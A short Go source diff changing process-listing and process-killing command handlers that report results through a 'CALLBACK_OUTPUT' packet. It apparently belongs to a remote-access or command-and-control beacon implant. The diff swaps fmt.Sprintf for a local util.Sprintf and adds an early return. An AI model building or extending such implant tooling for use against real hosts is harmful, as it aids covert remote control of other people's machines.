@@ -3,10 +3,10 @@ package command
 import (
 	"encoding/binary"
 	"errors"
-	"fmt"
 	"github.com/shirou/gopsutil/v3/process"
 	"main/packet"
 	"main/sysinfo"
+	"main/util"
 	"strconv"
 )
 
@@ -28,7 +28,7 @@ func ListProcess(pendingRequest []byte) error {
 			archString = "x86"
 		}
 
-		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
+		result += util.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
 	}
 	// command line ps
 	resultBytes := append(pendingRequest, []byte(result)...)
@@ -52,7 +52,8 @@ func KillProcess(b []byte) error {
 			if err != nil {
 				return err
 			}
-			packet.PushResult(packet.CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
+			packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("kill process %d success", pid)))
+			return nil
 		}
 	}
 	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
